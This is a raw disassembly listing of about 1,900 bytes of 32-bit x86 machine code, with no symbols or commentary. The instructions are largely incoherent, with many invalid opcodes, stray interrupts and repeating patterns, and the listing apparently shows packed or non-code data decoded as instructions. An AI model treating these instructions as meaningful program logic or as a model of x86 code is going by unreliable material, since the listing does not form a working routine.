  426aad:	mov    eax,0xa4670a
  426ab2:	add    BYTE PTR [eax],al
  426ab4:	int    0xf9
  426ab6:	pop    edi
  426ab7:	leave  
  426ab8:	xor    eax,0xab88080
  426abd:	iret   
  426abe:	add    BYTE PTR [eax],0x0
  426ac1:	add    ch,cl
  426ac3:	jge    0x426a7d
  426ac5:	or     cl,bh
  426ac7:	aam    0x0
  426ac9:	add    BYTE PTR [eax],al
  426acb:	int    0xc5
  426acd:	mov    eax,0xe0060a
  426ad2:	add    BYTE PTR [eax],al
  426ad4:	cmp    ebp,DWORD PTR [ebp-0x48]
  426ad7:	or     ah,BYTE PTR [edi-0x58]
  426ada:	add    BYTE PTR [eax],al
  426adc:	add    bh,cl
  426ade:	addr16 in al,0x0
  426ae1:	add    BYTE PTR [eax],al
  426ae3:	leave  
  426ae4:	push   es
  426ae5:	lods   al,BYTE PTR ds:[esi]
  426ae6:	add    BYTE PTR [eax],al
  426ae8:	add    dh,ah
  426aea:	xor    eax,0x6c9352b
  426aef:	fadd   DWORD PTR [eax]
  426af1:	add    BYTE PTR [eax],al
  426af3:	jae    0x426b2a
  426af5:	jno    0x426b2c
  426af7:	mov    eax,0x3076cdaf
  426afc:	int    0x8d
  426afe:	xor    ch,cl
  426b00:	xchg   esi,eax
  426b01:	xor    BYTE PTR [edx+eax*1],al
  426b04:	call   ebx
  426b06:	repnz sub BYTE PTR [ebx],bh
  426b09:	jns    0x426ade
  426b0b:	mov    ebp,0xcdd35392
  426b10:	lea    esi,[eax]
  426b12:	add    al,0x2
  426b14:	(bad)  
  426b15:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426b1b:	repz xchg edx,eax
  426b1d:	push   ebx
  426b1e:	jecxz  0x426b5b
  426b20:	retf   
  426b21:	add    al,0xd2
  426b23:	sbb    bl,BYTE PTR [ebx]
  426b25:	retf   
  426b26:	cmp    eax,DWORD PTR [eax]
  426b28:	inc    ebx
  426b29:	cli    
  426b2a:	das    
  426b2b:	or     cl,dl
  426b2d:	add    BYTE PTR [eax+0x43888280],0xd2
  426b34:	das    
  426b35:	add    al,0x37
  426b37:	add    BYTE PTR [eax+0x308dcd80],0xcd
  426b3e:	xchg   esi,eax
  426b3f:	xor    BYTE PTR [ebx],bh
  426b41:	psrlq  mm5,mm3
  426b44:	xchg   edx,eax
  426b45:	add    al,0xfb
  426b47:	call   ebx
  426b49:	jmp    0xcd7d:0x87135328
  426b50:	aad    0xb8
  426b52:	cmp    edx,DWORD PTR ds:0x708d
  426b58:	add    ch,cl
  426b5a:	lea    esi,[eax]
  426b5c:	int    0xe6
  426b5e:	xor    BYTE PTR [ebx],bh
  426b60:	psrlq  mm5,mm3
  426b63:	xchg   edx,eax
  426b64:	add    al,0xf8
  426b66:	call   ebx
  426b68:	jmp    0x8832be95
  426b6d:	jge    0x426b27
  426b6f:	int    0xcc
  426b71:	lea    esi,[eax+0x0]
  426b74:	add    BYTE PTR [eax],al
  426b76:	mov    eax,0xd3b8e3f8
  426b7b:	repnz das 
  426b7d:	mov    eax,0x53b8f3e3
  426b82:	jecxz  0x426b51
  426b84:	lea    esi,[eax]
  426b86:	int    0xe6
  426b88:	xor    BYTE PTR [ebx],bh
  426b8a:	psrlq  mm5,mm3
  426b8d:	xchg   edx,eax
  426b8e:	add    al,0xf8
  426b90:	call   ebx
  426b92:	jmp    0x8832bebf
  426b97:	jge    0x426b51
  426b99:	or     dl,BYTE PTR ds:0x708d
  426b9f:	add    ch,cl
  426ba1:	lea    esi,[eax]
  426ba3:	int    0x96
  426ba5:	xor    BYTE PTR [ebx],bh
  426ba7:	(bad)  
  426ba9:	sti    
  426baa:	call   ebx
  426bac:	jmp    0x426b40
  426bae:	shr    edx,cl
  426bb0:	sub    BYTE PTR [ebx+0x13],dl
  426bb3:	int    0x96
  426bb5:	xor    BYTE PTR [edi+0x308dcdd3],al
  426bbb:	add    al,0x2
  426bbd:	(bad)  
  426bbe:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426bc4:	repz xchg edx,eax
  426bc6:	push   ebx
  426bc7:	jecxz  0x426c04
  426bc9:	retf   
  426bca:	add    al,0xd2
  426bcc:	sbb    bl,BYTE PTR [ebx]
  426bce:	retf   
  426bcf:	cmp    eax,DWORD PTR [eax]
  426bd1:	inc    ebx
  426bd2:	cli    
  426bd3:	das    
  426bd4:	or     ebp,DWORD PTR [esi+0x2f000000]
  426bda:	pop    es
  426bdb:	pop    ebx
  426bdc:	add    BYTE PTR [eax],al
  426bde:	add    bl,al
  426be0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426be1:	mov    esi,0x76cf4229
  426be6:	jne    0x426bf2
  426be8:	jbe    0x426b72
  426bea:	int    0x76
  426bec:	mov    BYTE PTR [edi+0x13de37b6],bh
  426bf2:	or     bl,BYTE PTR [ecx+ecx*8]
  426bf5:	ins    BYTE PTR es:[edi],dx
  426bf6:	test   BYTE PTR [ebp-0x32dadcf6],bh
  426bfc:	jbe    0x426c73
  426bfe:	int    0x8d
  426c00:	jge    0x426c31
  426c02:	inc    ebp
  426c03:	jge    0x426b97
  426c05:	shr    ebx,cl
  426c07:	xchg   edx,eax
  426c08:	int    0x8d
  426c0a:	jne    0x426bd9
  426c0c:	xchg   esi,eax
  426c0d:	jge    0x426c4a
  426c0f:	leave  
  426c10:	cmp    ebx,edx
  426c12:	push   ebx
  426c13:	icebp  
  426c14:	int    0x76
  426c16:	cmc    
  426c17:	bound  eax,QWORD PTR [ebp-0x7f7f7edb]
  426c1d:	jo     0x426bee
  426c1f:	push   es
  426c20:	cmc    
  426c21:	inc    DWORD PTR [eax]
  426c23:	add    BYTE PTR [eax-0x2d],dh
  426c26:	repnz sub BYTE PTR [ebp+0xf2a3],bh
  426c2d:	int    0x76
  426c2f:	in     eax,dx
  426c30:	int    0x8d
  426c32:	adc    DWORD PTR [edi],ebp
  426c34:	inc    ebp
  426c35:	jge    0x426bc9
  426c37:	shr    ebx,cl
  426c39:	xchg   edx,eax
  426c3a:	int    0x8d
  426c3c:	in     eax,dx
  426c3d:	int    0x96
  426c3f:	adc    ebx,edx
  426c41:	repnz sub ch,cl
  426c44:	iret   
  426c45:	cmc    
  426c46:	inc    DWORD PTR [eax]
  426c48:	add    ch,cl
  426c4a:	mov    DWORD PTR [ebx],edi
  426c4c:	leave  
  426c4d:	cmp    ebx,edx
  426c4f:	push   ebx
  426c50:	rol    BYTE PTR [ebx+0x7d],cl
  426c53:	das    
  426c54:	push   es
  426c55:	push   ebp
  426c56:	add    BYTE PTR [eax-0xa293280],0xc9
  426c5d:	jbe    0x426c6c
  426c5f:	(bad)  
  426c60:	ficom  WORD PTR ss:[ebx]
  426c63:	pop    ebp
  426c64:	mov    ebp,0xa25230a
  426c69:	jbe    0x426c5c
  426c6b:	or     ah,BYTE PTR [esi-0x6289f56b]
  426c71:	int    0x76
  426c73:	xchg   ebp,eax
  426c74:	int    0x8d
  426c76:	popf   
  426c77:	das    
  426c78:	inc    ebp
  426c79:	jge    0x426c0d
  426c7b:	shr    ebx,cl
  426c7d:	xchg   edx,eax
  426c7e:	int    0x8d
  426c80:	xchg   ebp,eax
  426c81:	int    0x96
  426c83:	popf   
  426c84:	cmp    ecx,ecx
  426c86:	cmp    ebx,edx
  426c88:	push   ebx
  426c89:	icebp  
  426c8a:	bound  eax,QWORD PTR [eax]
  426c8c:	(bad)  
  426c8d:	xor    al,0xd3
  426c8f:	repnz sub BYTE PTR [eax],al
  426c92:	pop    ecx
  426c93:	xor    eax,0xbd808081
  426c98:	push   eax
  426c99:	repnz add BYTE PTR [eax],al
  426c9c:	int    0x76
  426c9e:	xchg   ebp,eax
  426c9f:	int    0x8d
  426ca1:	popf   
  426ca2:	das    
  426ca3:	inc    ebp
  426ca4:	jge    0x426c38
  426ca6:	shr    ebx,cl
  426ca8:	xchg   edx,eax
  426ca9:	int    0x8d
  426cab:	xchg   ebp,eax
  426cac:	int    0x96
  426cae:	popf   
  426caf:	cmp    ecx,ecx
  426cb1:	cmp    ebx,edx
  426cb3:	push   ebx
  426cb4:	icebp  
  426cb5:	bound  eax,QWORD PTR [eax]
  426cb7:	pop    ecx
  426cb8:	xor    eax,0xd3808081
  426cbd:	repnz sub BYTE PTR [eax],al
  426cc0:	pop    ecx
  426cc1:	sub    eax,0xbd808081
  426cc6:	xchg   edx,eax
  426cc7:	repnz add BYTE PTR [eax],al
  426cca:	int    0x7
  426ccc:	xor    eax,0xcd808081
  426cd1:	mov    ch,cl
  426cd3:	jle    0x426d39
  426cd5:	xchg   DWORD PTR [eax-0x327772f6],ecx
  426cdb:	lea    ecx,ds:0x2ff176cd
  426ce1:	inc    ebp
  426ce2:	rcl    DWORD PTR [edx-0x326d422d],cl
  426ce8:	jbe    0x426cf7
  426cea:	int    0x96
  426cec:	icebp  
  426ced:	cmp    esi,eax
  426cef:	shr    DWORD PTR [ebp+0x536d3b28],cl
  426cf5:	ror    ebp,cl
  426cf7:	lea    ecx,[eax+0x187ebb2f]
  426cfd:	push   es
  426cfe:	jge    0x426cd4
  426d00:	dec    esp
  426d01:	int    0x7
  426d03:	popf   
  426d04:	add    DWORD PTR [eax+0x4180c980],0xcd358621
  426d0e:	jbe    0x426d5c
  426d10:	int    0x76
  426d12:	xor    BYTE PTR [eax],al
  426d14:	(bad)  
  426d15:	cmp    al,0x0
  426d17:	(bad)  
  426d18:	cmc    
  426d19:	add    dh,dl
  426d1b:	sub    al,0x0
  426d1d:	(bad)  
  426d1e:	and    al,0x0
  426d20:	(bad)  
  426d21:	sbb    al,0x0
  426d23:	(bad)  
  426d24:	adc    al,0xbd
  426d26:	test   ch,dh
  426d28:	add    BYTE PTR [eax],al
  426d2a:	or     al,BYTE PTR [esi]
  426d2c:	adc    edi,edi
  426d2e:	add    BYTE PTR [eax],al
  426d30:	int    0x76
  426d32:	cmp    al,0x4
  426d34:	fcom   QWORD PTR [eax+eax*4]
  426d37:	aam    0x1a
  426d39:	int    0x76
  426d3b:	cmp    al,0x4
  426d3d:	fsub   QWORD PTR [eax+eax*4]
  426d40:	aam    0x4e
  426d42:	int    0x6
  426d44:	adc    edi,edi
  426d46:	add    BYTE PTR [eax],al
  426d48:	int    0x8d
  426d4a:	cmp    al,0xa
  426d4c:	outs   dx,BYTE PTR ds:[esi]
  426d4d:	sbb    al,0xec
  426d4f:	push   ebx
  426d50:	add    dh,dl
  426d52:	cmp    al,0x0
  426d54:	(bad)  
  426d55:	cmc    
  426d56:	mov    ebp,0x6daa
  426d5b:	stos   BYTE PTR es:[edi],al
  426d5c:	test   al,0x63
  426d5e:	retf   
  426d5f:	shl    BYTE PTR [eax+eax*4],cl
  426d62:	xchg   esi,eax
  426d63:	int    0xed
  426d65:	jno    0x426dd8
  426d67:	cwde   
  426d68:	leave  
  426d69:	jbe    0x426d68
  426d6b:	dec    ecx
  426d6c:	and    DWORD PTR [esi-0x68936cb],eax
  426d72:	inc    ecx
  426d73:	and    DWORD PTR [esi-0x28932cb],eax
  426d79:	int    0xd6
  426d7b:	std    
  426d7c:	sar    bh,0x5f
  426d7f:	shl    DWORD PTR [ecx],1
  426d81:	xchg   BYTE PTR ds:0x3ba0d33b,dh
  426d87:	sti    
  426d88:	sar    DWORD PTR [ebp+0x28b9d392],cl
  426d8e:	push   ebx
  426d8f:	jns    0x426d5e
  426d91:	(bad)  
  426d92:	mov    BYTE PTR [ebx+0x11],al
  426d95:	int    0x76
  426d97:	std    
  426d98:	aam    0xc4
  426d9a:	int    0xd6
  426d9c:	std    
  426d9d:	cmp    edx,ebx
  426d9f:	cmp    edi,ebx
  426da1:	sar    DWORD PTR [ecx-0x6d422cd8],cl
  426da7:	push   ebx
  426da8:	jns    0x426d77
  426daa:	(bad)  
  426dab:	dec    esp
  426dac:	inc    ebx
  426dad:	adc    esp,edx
  426daf:	pop    ebx
  426db0:	int    0x96
  426db2:	xor    BYTE PTR [edx-0x32b31933],bl
  426db8:	jbe    0x426d42
  426dba:	cmp    esi,edi
  426dbc:	push   es
  426dbd:	add    ah,dl
  426dbf:	push   esi
  426dc0:	pop    ebx
  426dc1:	retf   0x8624
  426dc4:	or     DWORD PTR [esi-0x59a6d0d1],esp
  426dca:	das    
  426dcb:	push   es
  426dcc:	fcmovbe st,st(6)
  426dce:	dec    esi
  426dcf:	add    al,0xf4
  426dd1:	adc    DWORD PTR [edx],0xffffffc5
  426dd4:	fwait
  426dd5:	add    BYTE PTR [eax+0x2fa60980],0xec
  426ddc:	dec    esp
  426ddd:	adc    ch,ah
  426ddf:	in     eax,dx
  426de0:	add    BYTE PTR [eax+0x2fa60980],0xf1
  426de7:	lea    ebp,[edi]
  426de9:	retf   0x2fa6
  426dec:	or     DWORD PTR [esi+eax*4],esp
  426def:	js     0x426e34
  426df1:	clc    
  426df2:	or     BYTE PTR [esi],0x63
  426df5:	int    0x76
  426df7:	stc    
  426df8:	cmp    edx,ebx
  426dfa:	int    0x8d
  426dfc:	stc    
  426dfd:	add    al,0x2
  426dff:	jmp    FWORD PTR [edx+0x76cd4aec]
  426e05:	std    
  426e06:	cmp    edx,ebx
  426e08:	int    0x8d
  426e0a:	std    
  426e0b:	cmp    edx,DWORD PTR [ebx]
  426e0d:	shl    edx,cl
  426e0f:	sub    bl,dl
  426e11:	mov    ebp,0xa8d35392
  426e16:	retf   
  426e17:	ror    BYTE PTR [eax+eax*4-0x6a],cl
  426e1b:	int    0xed
  426e1d:	add    al,0xed
  426e1f:	(bad)  
  426e20:	leave  
  426e21:	jbe    0x426e20
  426e23:	dec    ecx
  426e24:	and    DWORD PTR [esi+0x21416135],eax
  426e2a:	xchg   BYTE PTR ds:0xcdf9960a,dh
  426e30:	jbe    0x426e46
  426e32:	or     dh,BYTE PTR [esi+0x14]
  426e35:	int    0x76
  426e37:	adc    al,0xcd
  426e39:	add    DWORD PTR ds:0xcd808081,ebp
  426e3f:	lea    edx,[ecx*8+0x2d0acd80]
  426e46:	add    DWORD PTR [eax-0x78763280],0xa5b647c
  426e50:	lea    esi,[ebp-0x32028933]
  426e56:	(bad)  
  426e57:	std    
  426e58:	cwde   
  426e59:	call   0x3b85:0x82cfffc0
  426e60:	jns    0x426e35
  426e62:	mov    ebp,0xf03baa92
  426e67:	shl    edx,cl
  426e69:	sub    BYTE PTR [ebx-0x2d],dl
  426e6c:	or     dh,BYTE PTR [esi-0x63]
  426e6f:	int    0x76
  426e71:	std    
  426e72:	int    0x8d
  426e74:	std    
  426e75:	cmp    edi,DWORD PTR [ecx-0x2d]
  426e78:	mov    ebp,0xd3f03b92
  426e7d:	repnz sub BYTE PTR [ebx-0x2d],dl
  426e81:	or     dh,BYTE PTR [esi-0x53]
  426e84:	int    0x76
  426e86:	mov    ch,0xcd
  426e88:	ins    BYTE PTR es:[edi],dx
  426e89:	jo     0x426e8f
  426e8b:	mov    ebp,0xf1760a4c
  426e90:	int    0x76
  426e92:	mov    ch,0xcd
  426e94:	ins    BYTE PTR es:[edi],dx
  426e95:	pop    esp
  426e96:	int    0x8d
  426e98:	mov    ch,0x7c
  426e9a:	push   es
  426e9b:	outs   dx,BYTE PTR ds:[esi]
  426e9c:	xchg   esp,eax
  426e9d:	int    0x76
  426e9f:	mov    ch,0xd4
  426ea1:	sbb    al,0xcd
  426ea3:	ins    BYTE PTR es:[edi],dx
  426ea4:	pop    esp
  426ea5:	int    0x8d
  426ea7:	mov    ch,0xcd
  426ea9:	jle    0x426e3f
  426eab:	jl     0x426ea5
  426ead:	icebp  
  426eae:	sub    edi,DWORD PTR [ebp-0x33]
  426eb1:	jbe    0x426e68
  426eb3:	int    0x6c
  426eb5:	pop    esp
  426eb6:	xchg   ebx,edx
  426eb8:	in     al,dx
  426eb9:	xchg   ebp,ecx
  426ebb:	ins    BYTE PTR es:[edi],dx
  426ebc:	xchg   esp,eax
  426ebd:	or     dh,BYTE PTR [esi-0x43]
  426ec0:	int    0x76
  426ec2:	std    
  426ec3:	int    0x8d
  426ec5:	std    
  426ec6:	cmp    edi,DWORD PTR [ecx+0x3b]
  426ec9:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426ed0:	push   ebx
  426ed1:	ror    DWORD PTR [edx],cl
  426ed3:	jbe    0x426ee9
  426ed5:	int    0x76
  426ed7:	std    
  426ed8:	int    0x8d
  426eda:	std    
  426edb:	cmp    edi,DWORD PTR [ecx+0x3b]
  426ede:	lock shl edx,cl
  426ee1:	sub    bl,dl
  426ee3:	mov    ebp,0xad35392
  426ee8:	jbe    0x426efe
  426eea:	int    0x76
  426eec:	std    
  426eed:	int    0x8d
  426eef:	std    
  426ef0:	cmp    esi,eax
  426ef2:	cmp    edi,DWORD PTR [ecx-0x2d]
  426ef5:	repnz sub bl,dl
  426ef8:	mov    ebp,0xcdd35392
  426efd:	lea    esi,[eax]
  426eff:	or     al,BYTE PTR [ecx-0x36eb69f6]
  426f05:	jbe    0x426f1b
  426f07:	cmp    DWORD PTR [ecx],esp
  426f09:	xchg   BYTE PTR ds:0xb21476c9,dh
  426f0f:	and    DWORD PTR [esi+0x1476c935],eax
  426f15:	imul   esp,DWORD PTR [ecx],0x36eb3586
  426f1b:	xchg   BYTE PTR [eax-0x2893280],al
  426f21:	int    0x8d
  426f23:	std    
  426f24:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f27:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f2e:	push   ebx
  426f2f:	ror    DWORD PTR [edx],cl
  426f31:	jbe    0x426ee0
  426f33:	int    0x76
  426f35:	mov    ebp,0xa4c7687
  426f3a:	jbe    0x426ed9
  426f3c:	add    dh,dl
  426f3e:	popf   
  426f3f:	add    dh,dl
  426f41:	dec    esp
  426f42:	int    0x8d
  426f44:	mov    ch,0xbd
  426f46:	neg    bh
  426f48:	add    BYTE PTR [eax],al
  426f4a:	or     dh,BYTE PTR [esi+0x14]
  426f4d:	int    0x76
  426f4f:	adc    al,0x6
  426f51:	ins    DWORD PTR es:[edi],dx
  426f52:	aam    0x60
  426f54:	int    0x76
  426f56:	popf   
  426f57:	or     dh,BYTE PTR [esi-0x5b]
  426f5a:	int    0x76
  426f5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f5d:	int    0x8d
  426f5f:	dec    esp
  426f60:	xor    edx,ebx
  426f62:	or     dh,BYTE PTR [esi-0x5b]
  426f65:	int    0x76
  426f67:	adc    al,0xcd
  426f69:	lea    edx,[ecx*8+0x6e87306c]
  426f70:	dec    esp
  426f71:	int    0x8d
  426f73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f74:	inc    ebx
  426f75:	jge    0x426ef9
  426f77:	sbb    ch,cl
  426f79:	jbe    0x426f8f
  426f7b:	int    0x6c
  426f7d:	dec    esp
  426f7e:	int    0x8d
  426f80:	adc    al,0x87
  426f82:	outs   dx,BYTE PTR ds:[esi]
  426f83:	mov    ch,cl
  426f85:	lea    esp,[ebp-0x2e142ccd]
  426f8b:	test   DWORD PTR [eax+0x2149bf80],eax
  426f91:	xchg   BYTE PTR ds:0xc90da60a,dh
  426f97:	jbe    0x427016
  426f99:	inc    ecx
  426f9a:	and    DWORD PTR [esi+0x7576c935],eax
  426fa0:	cmp    DWORD PTR [ecx],esp
  426fa2:	xchg   BYTE PTR ds:0xb26d76c9,dh
  426fa8:	and    DWORD PTR [esi+0xd76cf35],eax
  426fae:	or     dh,BYTE PTR [esi-0xb]
  426fb1:	iret   
  426fb2:	jbe    0x427031
  426fb4:	or     dh,BYTE PTR [esi+0x11]
  426fb7:	iret   
  426fb8:	jbe    0x42702f
  426fba:	or     dh,BYTE PTR [esi+0x14]
  426fbd:	iret   
  426fbe:	jbe    0x42702d
  426fc0:	or     dh,BYTE PTR [esi-0x13]
  426fc3:	int    0x76
  426fc5:	std    
  426fc6:	int    0x8d
  426fc8:	std    
  426fc9:	cmp    edi,DWORD PTR [ecx+0x3b]
  426fcc:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426fd3:	push   ebx
  426fd4:	ror    DWORD PTR [edx],cl
  426fd6:	jbe    0x426f7d
  426fd8:	jmp    0x426fed
  426fda:	xchg   DWORD PTR [eax-0x4d03ed80],eax
  426fe0:	and    DWORD PTR [esi-0x22fad0cb],eax
  426fe6:	xchg   DWORD PTR [eax+0x4cc080],eax
  426fec:	(bad)  
  426fed:	popf   
  426fee:	iret   
  426fef:	jbe    0x426fc1
  426ff1:	jo     0x426fb0
  426ff3:	xlat   BYTE PTR ds:[ebx]
  426ff4:	fild   WORD PTR [eax]
  426ff6:	add    ch,cl
  426ff8:	jbe    0x426ff3
  426ffa:	int    0x8d
  426ffc:	stc    
  426ffd:	cmp    edi,DWORD PTR [ecx+0x3b]
  427000:	lock shl edx,cl
  427003:	sub    bl,dl
  427005:	mov    ebp,0xad35392
  42700a:	jbe    0x426fb9
  42700c:	or     ah,BYTE PTR [esi-0x6a29ae6b]
  427012:	int    0x76
  427014:	xchg   ebp,eax
  427015:	sar    DWORD PTR [ebp-0x2c1ec46e],cl
  42701b:	in     eax,0x28
  42701d:	push   ebx
  42701e:	popf   
  42701f:	or     ah,BYTE PTR [esi-0x689325b]
  427025:	int    0x8d
  427027:	stc    
  427028:	cmp    esi,eax
  42702a:	shl    edx,cl
  42702c:	sub    BYTE PTR [ebx],bh
  42702e:	jns    0x427003
  427030:	mov    ebp,0xcdd35392
  427035:	(bad)  
  427036:	stc    
  427037:	int    0x96
  427039:	stc    
  42703a:	cmp    ecx,DWORD PTR [edi]
  42703c:	cmp    ebx,ecx
  42703e:	shr    ebx,cl
  427040:	xchg   edx,eax
  427041:	shr    edx,cl
  427043:	sub    BYTE PTR [ebx+0x13],dl
  427046:	xchg   ebx,edx
  427048:	int    0x8d
  42704a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42704b:	or     ah,BYTE PTR [esi-0x2982bc9b]
  427051:	sub    ch,cl
  427053:	jbe    0x42704e
  427055:	int    0x8d
  427057:	stc    
  427058:	cmp    edi,DWORD PTR [ecx+0x3b]
  42705b:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427062:	push   ebx
  427063:	shl    DWORD PTR [eax-0x40],cl
  427066:	dec    esp
  427067:	iret   
  427068:	jbe    0x42703a
  42706a:	jo     0x427029
  42706c:	sti    
  42706d:	std    
  42706e:	add    BYTE PTR [eax],al
  427070:	int    0x76
  427072:	std    
  427073:	int    0x8d
  427075:	std    
  427076:	cmp    edi,DWORD PTR [ecx+0x3b]
  427079:	lock shl edx,cl
  42707c:	sub    bl,dl
  42707e:	mov    ebp,0xcdd35392
  427083:	lea    esp,[ebp+0x28d47d43]
  427089:	int    0x76
  42708b:	std    
  42708c:	int    0x8d
  42708e:	std    
  42708f:	cmp    edi,DWORD PTR [ecx+0x3b]
  427092:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427099:	push   ebx
  42709a:	shl    DWORD PTR [eax-0x40],cl
  42709d:	dec    esp
  42709e:	iret   
  42709f:	jbe    0x427071
  4270a1:	jo     0x427060
  4270a3:	mov    edi,0xcd0000fd
  4270a8:	jbe    0x42709f
  4270aa:	int    0x8d
  4270ac:	cmc    
  4270ad:	int    0x89
  4270af:	int    0x80
  4270b1:	cmp    esi,eax
  4270b3:	cmp    edi,DWORD PTR [ecx-0x2d]
  4270b6:	repnz sub bl,dl
  4270b9:	mov    ebp,0xcad35392
  4270be:	je     0x427045
  4270c0:	ror    ch,1
  4270c2:	(bad)  
  4270c3:	std    
  4270c4:	int    0x96
  4270c6:	std    
  4270c7:	cmp    ecx,DWORD PTR [edi]
  4270c9:	cmp    ebx,ecx
  4270cb:	shr    ebx,cl
  4270cd:	xchg   edx,eax
  4270ce:	shr    edx,cl
  4270d0:	sub    BYTE PTR [edi],ch
  4270d2:	pop    ecx
  4270d3:	ins    DWORD PTR es:[edi],dx
  4270d4:	push   ebx
  4270d5:	adc    eax,DWORD PTR [ebx-0x2d]
  4270d8:	das    
  4270d9:	add    eax,0x80809212
  4270de:	int    0x76
  4270e0:	adc    ebp,ecx
  4270e2:	lea    edx,[ecx]
  4270e4:	int    0x89
  4270e6:	int    0x80
  4270e8:	cmp    esi,eax
  4270ea:	cmp    edi,DWORD PTR [ecx-0x2d]
  4270ed:	repnz sub bl,dl
  4270f0:	mov    ebp,0xcad35392
  4270f5:	je     0x42707c
  4270f7:	ror    ch,1
  4270f9:	(bad)  
  4270fa:	std    
  4270fb:	int    0x96
  4270fd:	std    
  4270fe:	cmp    ecx,DWORD PTR [edi]
  427100:	cmp    ebx,ecx
  427102:	shr    ebx,cl
  427104:	xchg   edx,eax
  427105:	shr    edx,cl
  427107:	sub    BYTE PTR [edi],ch
  427109:	pop    ecx
  42710a:	ins    DWORD PTR es:[edi],dx
  42710b:	push   ebx
  42710c:	adc    eax,DWORD PTR [ebx-0x2d]
  42710f:	das    
  427110:	add    eax,0x8080928a
  427115:	int    0x76
  427117:	adc    al,0xcd
  427119:	lea    edx,[ecx*8+0x3b80cd89]
  427120:	lock cmp edi,DWORD PTR [ecx-0x2d]
  427124:	repnz sub bl,dl
  427127:	mov    ebp,0xcad35392
  42712c:	je     0x4270b3
  42712e:	ror    ch,1
  427130:	(bad)  
  427131:	std    
  427132:	int    0x96
  427134:	std    
  427135:	cmp    ecx,DWORD PTR [edi]
  427137:	cmp    ebx,ecx
  427139:	shr    ebx,cl
  42713b:	xchg   edx,eax
  42713c:	shr    edx,cl
  42713e:	sub    BYTE PTR [edi],ch
  427140:	pop    ecx
  427141:	ins    DWORD PTR es:[edi],dx
  427142:	push   ebx
  427143:	adc    eax,DWORD PTR [ebx-0x2d]
  427146:	das    
  427147:	add    eax,0x8080921b
  42714c:	int    0x76
  42714e:	in     eax,dx
  42714f:	int    0x8d
  427151:	in     eax,dx
  427152:	int    0x89
  427154:	int    0x80
  427156:	cmp    esi,eax
  427158:	cmp    edi,DWORD PTR [ecx-0x2d]
  42715b:	repnz sub bl,dl
  42715e:	mov    ebp,0xcad35392
  427163:	je     0x4270ea
  427165:	ror    ch,1
  427167:	(bad)  
  427168:	std    
  427169:	int    0x96
  42716b:	std    
  42716c:	cmp    ecx,DWORD PTR [edi]
  42716e:	cmp    ebx,ecx
  427170:	shr    ebx,cl
  427172:	xchg   edx,eax
  427173:	shr    edx,cl
  427175:	sub    BYTE PTR [edi],ch
  427177:	pop    ecx
  427178:	ins    DWORD PTR es:[edi],dx
  427179:	push   ebx
  42717a:	adc    eax,DWORD PTR [ebx-0x2d]
  42717d:	das    
  42717e:	add    eax,0x808081a5
  427183:	int    0x76
  427185:	adc    ebp,ecx
  427187:	lea    edx,[ecx]
  427189:	int    0x89
  42718b:	int    0x80
  42718d:	cmp    esi,eax
  42718f:	shl    edx,cl
  427191:	sub    BYTE PTR [ebx],bh
  427193:	jns    0x427168
  427195:	mov    ebp,0xcad35392
  42719a:	je     0x427121
  42719c:	ror    ch,1
  42719e:	(bad)  
  42719f:	cmc    
  4271a0:	int    0x89
  4271a2:	int    0x96
  4271a4:	cmc    
  4271a5:	int    0x22
  4271a7:	cmp    ecx,DWORD PTR [edi]
  4271a9:	shr    ebx,cl
  4271ab:	xchg   edx,eax
  4271ac:	cmp    ebx,ecx
  4271ae:	shr    edx,cl
  4271b0:	sub    BYTE PTR [ebx+0x13],dl
  4271b3:	retf   0x4d8c
  4271b6:	rol    BYTE PTR [edx-0x2d],1
  4271b9:	int    0x8d
  4271bb:	adc    al,0xcd
  4271bd:	mov    ebp,ecx
  4271bf:	xchg   esi,eax
  4271c0:	adc    al,0xcd
  4271c2:	and    bh,BYTE PTR [ebx]
  4271c4:	psrlq  mm5,mm3
  4271c7:	xchg   edx,eax
  4271c8:	cmp    ebx,ecx
  4271ca:	shr    edx,cl
  4271cc:	sub    BYTE PTR [ebx+0x13],dl
  4271cf:	retf   0x4d8c
  4271d2:	ror    BYTE PTR [edx-0x2d],1
  4271d5:	int    0x8d
  4271d7:	cmc    
  4271d8:	int    0x89
  4271da:	int    0x96
  4271dc:	cmc    
  4271dd:	int    0x22
  4271df:	cmp    ecx,DWORD PTR [edi]
  4271e1:	cmp    ebx,ecx
  4271e3:	shr    ebx,cl
  4271e5:	xchg   edx,eax
  4271e6:	shr    edx,cl
  4271e8:	sub    BYTE PTR [ebx+0x13],dl
  4271eb:	retf   0x4d8c
  4271ee:	push   ebp
  4271ef:	pusha  
  4271f0:	jge    0x427221
  4271f2:	push   es
  4271f3:	mov    esp,0xcd808081
  4271f8:	jbe    0x42720e
  4271fa:	int    0x8d
  4271fc:	adc    al,0xcd
  4271fe:	mov    ebp,ecx
  427200:	cmp    BYTE PTR [ebx],0xf0
  427203:	shl    edx,cl
  427205:	sub    BYTE PTR [ebx],bh
  427207:	jns    0x4271dc
  427209:	mov    ebp,0xcad35392
  42720e:	je     0x427195
  427210:	ror    ch,1
  427212:	lea    edx,[ecx]
  427214:	int    0x89
  427216:	int    0x96
  427218:	adc    ebp,ecx
  42721a:	and    bh,BYTE PTR [ebx]
  42721c:	psrlq  mm5,mm3
  42721f:	xchg   edx,eax
  427220:	cmp    ebx,ecx
  427222:	shr    edx,cl
  427224:	sub    BYTE PTR [ebx+0x13],dl
  427227:	retf   0x4d8c
  42722a:	rol    BYTE PTR [edx-0x2d],1
  42722d:	int    0x8d
  42722f:	in     eax,dx
  427230:	int    0x89
  427232:	int    0x96
  427234:	in     eax,dx
  427235:	int    0x22
  427237:	cmp    ecx,DWORD PTR [edi]
  427239:	shr    ebx,cl
  42723b:	xchg   edx,eax
  42723c:	cmp    ebx,ecx
  42723e:	shr    edx,cl
  427240:	sub    BYTE PTR [ebx+0x13],dl
  427243:	retf   0x4d8c
  427246:	ror    BYTE PTR [edx-0x2d],1
  427249:	int    0x8d
